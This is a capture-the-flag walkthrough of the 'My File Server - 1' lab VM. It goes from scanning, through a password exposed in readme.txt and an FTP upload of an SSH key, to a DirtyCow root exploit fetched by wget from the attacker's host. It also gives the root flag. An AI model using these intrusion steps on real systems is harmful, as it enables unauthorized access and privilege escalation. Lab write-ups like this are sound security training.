# My File Server

## Port Scanning

```
t0thkr1s@kali ~> nmap -A -Pn -p- 192.168.1.72
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-11 11:31 CDT
Nmap scan report for 192.168.1.72
Host is up (0.00058s latency).
Not shown: 64523 filtered ports, 1004 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    3 0        0              16 Feb 19 07:48 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.67
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)
|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)
|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: My File Server
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      45710/tcp   nlockmgr
|   100021  1,3,4      52690/udp   nlockmgr
|   100021  1,3,4      56345/tcp6  nlockmgr
|   100021  1,3,4      58300/udp6  nlockmgr
|   100024  1          40888/tcp   status
|   100024  1          48111/udp6  status
|   100024  1          48322/tcp6  status
|   100024  1          50088/udp   status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
445/tcp   open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
2049/tcp  open  nfs_acl     3 (RPC #100227)
2121/tcp  open  ftp         ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
20048/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: FILESERVER; OS: Unix

Host script results:
|_clock-skew: mean: -1d05h44m11s, deviation: 3h10m30s, median: -1d03h54m12s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.1)
|   Computer name: localhost
|   NetBIOS computer name: FILESERVER\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2020-03-10T18:08:50+05:30
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-10T12:38:52
|_  start_date: N/A
```

## HTTP Enumeration

```
t0thkr1s@kali ~> nikto -h 192.168.1.72
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.72
+ Target Hostname:    192.168.1.72
+ Target Port:        80
+ Start Time:         2020-03-11 11:52:58 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /readme.txt: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-03-11 11:53:49 (GMT-5) (51 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
t0thkr1s@kali ~> curl http://192.168.1.72/readme.txt
My Password is
rootroot1
```

## FTP Enumeration

```
t0thkr1s@kali ~> ftp 192.168.1.72
Connected to 192.168.1.72.
220 (vsFTPd 3.0.2)
Name (192.168.1.72:t0thkr1s): smbuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/home/smbuser"
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000           79 Feb 18 12:39 .
drwxr-xr-x    3 0        0              20 Feb 19 07:04 ..
-rw-------    1 1000     1000           27 Feb 20 11:15 .bash_history
-rw-r--r--    1 1000     1000           18 Mar 05  2015 .bash_logout
-rw-r--r--    1 1000     1000          193 Mar 05  2015 .bash_profile
-rw-r--r--    1 1000     1000          231 Mar 05  2015 .bashrc
226 Directory send OK.
ftp>
```

```
t0thkr1s@kali ~> ssh-keygen -f smbuser
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in smbuser
Your public key has been saved in smbuser.pub
The key fingerprint is:
SHA256:No2tWVujvkMq0379+ckNkKIilqNNPPDMkcvUOymU+iI t0thkr1s@kali
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|                 |
|     +   +   .   |
|  . * . S = =    |
|   @ + + *.= o   |
|  . / =.+oo.  .  |
|E .* =ooo.o . .oo|
| ...o  +..oo .o+o|
+----[SHA256]-----+
t0thkr1s@kali ~> ls
Desktop/  Documents/  Downloads/  lastlog  maillog  messages  Pictures/  smbuser  smbuser.pub  sshd_config
t0thkr1s@kali ~> rm lastlog maillog messages sshd_config 
t0thkr1s@kali ~> ls
Desktop/  Documents/  Downloads/  Pictures/  smbuser  smbuser.pub
t0thkr1s@kali ~> cat smbuser.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtm24u790y39p2jKCfWGIJAw4jv1qXpx6VtvcntzdF2fObBBr07eBBs5BDa2dqEDNq5xG1lHnDt/bLrvAc5fqNbz2GWgtXyJIs2362TIFI12Yg8VEutbcvgcI0XbDvW12xY55eGiGiFwc22AZ7fDUIQXKHTkaxvqWlyhDWj6CUTW1uy7mCOeni2hB2DVIZcQX2gyafjn3CNgHcuwa3gZcqf16e5ShJ3cHFVN5fObQ+RMN/cpYv1WTi6sEBsmt+Ax9tv/xdLOVTyyQDCea4ifYdGw7L51qe9f5fOwA7ikK0B+y/8R/6WDrif3Eh5lyWZ5bR034bCYXgt0rP/vFhCLfIqS3USb44bX4Apj8Zjln7KUiYKyOO5eL21rOBCfrCErDb8Pom1mhuz76/JN9mMG4wOg64sXUXU34wZ3jdDO4AoSvk4L0icsFJWQ/9VQpfCFjDZpH/L5rKH3wmWqE8dXTf9YNPaRwEHUn9y9UhoEyAuQy/b4CypRDWXxGNOHkuPWc= t0thkr1s@kali
t0thkr1s@kali ~> mv smbuser.pub authorized_keys
t0thkr1s@kali ~> ftp 192.168.1.72
Connected to 192.168.1.72.
220 (vsFTPd 3.0.2)
Name (192.168.1.72:t0thkr1s): smbuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000           79 Feb 18 12:39 .
drwxr-xr-x    3 0        0              20 Feb 19 07:04 ..
-rw-------    1 1000     1000           27 Feb 20 11:15 .bash_history
-rw-r--r--    1 1000     1000           18 Mar 05  2015 .bash_logout
-rw-r--r--    1 1000     1000          193 Mar 05  2015 .bash_profile
-rw-r--r--    1 1000     1000          231 Mar 05  2015 .bashrc
226 Directory send OK.
ftp> mkdir .ssh
257 "/home/smbuser/.ssh" created
ftp> cd .ssh
250 Directory successfully changed.
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
567 bytes sent in 0.00 secs (4.8715 MB/s)
ftp> exit
221 Goodbye.
t0thkr1s@kali ~>
```

```
t0thkr1s@kali ~> ssh -i smbuser smbuser@192.168.1.72
   ##############################################################################################
   #                                      Armour Infosec                                        #
   #                         --------- www.armourinfosec.com ------------                       #
   #                                    My File Server - 1                                      #
   #                               Designed By  :- Akanksha Sachin Verma                        #
   #                               Twitter      :- @akankshavermasv                             #
   ##############################################################################################

Last login: Thu Feb 20 16:42:21 2020
[smbuser@fileserver ~]$ id
uid=1000(smbuser) gid=1000(smbuser) groups=1000(smbuser)
[smbuser@fileserver ~]$ ls -la
total 16
drwx------  3 smbuser smbuser  90 Mar 10 19:27 .
drwxr-xr-x. 3 root    root     20 Feb 19 12:34 ..
-rw-------  1 smbuser smbuser  27 Feb 20 16:45 .bash_history
-rw-r--r--  1 smbuser smbuser  18 Mar  6  2015 .bash_logout
-rw-r--r--  1 smbuser smbuser 193 Mar  6  2015 .bash_profile
-rw-r--r--  1 smbuser smbuser 231 Mar  6  2015 .bashrc
drwxr-xr-x  2 smbuser smbuser  28 Mar 10 19:27 .ssh
[smbuser@fileserver ~]$
```

## Privilege Escalation

```
====================================( System Information )====================================
[+] Operative system                                                                                                          
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                               
Linux version 3.10.0-229.el7.x86_64 (builder@kbuilder.dev.centos.org) (gcc version 4.8.2 20140120 (Red Hat 4.8.2-16) (GCC) ) #1 SMP Fri Mar 6 11:36:42 UTC 2015
```

https://www.exploit-db.com/exploits/40616

```
[smbuser@fileserver tmp]$ wget 192.168.1.67/exploit.c
--2020-03-12 01:04:59--  http://192.168.1.67/exploit.c
Connecting to 192.168.1.67:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4819 (4.7K) [text/plain]
Saving to: ‘exploit.c’

100%[===========================================================================================>] 4,819       --.-K/s   in 0s      

2020-03-12 01:04:59 (703 MB/s) - ‘exploit.c’ saved [4819/4819]

[smbuser@fileserver tmp]$ gcc exploit.c -o exploit -pthread
exploit.c: In function ‘procselfmemThread’:
exploit.c:99:9: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast [enabled by default]
         lseek(f,map,SEEK_SET);
         ^
In file included from exploit.c:28:0:
/usr/include/unistd.h:334:16: note: expected ‘__off_t’ but argument is of type ‘void *’
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
[smbuser@fileserver tmp]$ ./exploit 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 27832
Racing, this may take a while..
thread stopped
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
[root@fileserver tmp]# id
uid=0(root) gid=1000(smbuser) groups=0(root),1000(smbuser)
[root@fileserver tmp]# cd /root
[root@fileserver root]# ls
proof.txt
[root@fileserver root]# cat proof.txt 
Best of Luck
af52e0163b03cbf7c6dd146351594a43
[root@fileserver root]#
```

> Root Flag: af52e0163b03cbf7c6dd146351594a43
